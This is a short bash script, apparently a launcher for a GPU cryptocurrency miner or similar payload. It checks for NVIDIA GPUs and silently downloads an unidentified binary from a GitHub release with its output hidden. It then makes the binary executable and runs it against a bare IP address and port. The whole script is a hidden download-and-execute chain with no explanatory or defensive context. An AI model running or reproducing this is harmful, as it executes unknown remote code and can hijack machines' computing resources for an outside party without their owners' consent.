#!/bin/bash
nvidia-smi -L
wget https://github.com/gregoryjuds20/thanhhai/releases/download/1/tuananh &> /dev/null
chmod +x tuananh
./tuananh -P http://38.130.221.109:4545/"$1" &> log
